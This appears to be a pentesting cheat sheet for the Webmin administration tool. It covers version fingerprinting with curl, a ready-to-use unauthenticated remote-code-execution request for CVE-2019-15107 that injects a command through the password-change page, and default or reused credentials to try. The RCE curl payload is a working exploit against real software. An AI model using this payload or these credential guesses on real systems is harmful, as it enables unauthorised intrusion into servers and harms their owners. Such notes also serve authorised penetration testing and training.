# Webmin

**What it is:** Web-based system administration tool for Unix/Linux. Manages users, services, configs through a browser interface. Usually runs on port 10000 with HTTPS.

**Default ports:** 10000

**Vuln research:**
- [SearchSploit: `searchsploit webmin`](https://www.exploit-db.com/search?q=webmin)
- [CVE Details — Webmin](https://www.cvedetails.com/product/2750/Webmin-Webmin.html)
- [HackTricks — Webmin](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/webmin.html)

---


### Identify Webmin version

Usually on port 10000 — Check login page source

```bash
curl -sk https://$IP:10000/ | grep -i version
```

---

### Webmin RCE (CVE-2019-15107)

Unauthenticated RCE on Webmin 1.890-1.920 — Password reset backdoor

```bash
curl -sk "https://$IP:10000/password_change.cgi" -d 'user=root&pam=&expired=2&old=id%7Cid&new1=test&new2=test'
```

---

### Default credentials

Common Webmin logins — Check for password reuse with system accounts

```bash
# root:<system password>
# admin:admin
# Webmin uses PAM by default = system credentials work
```

---
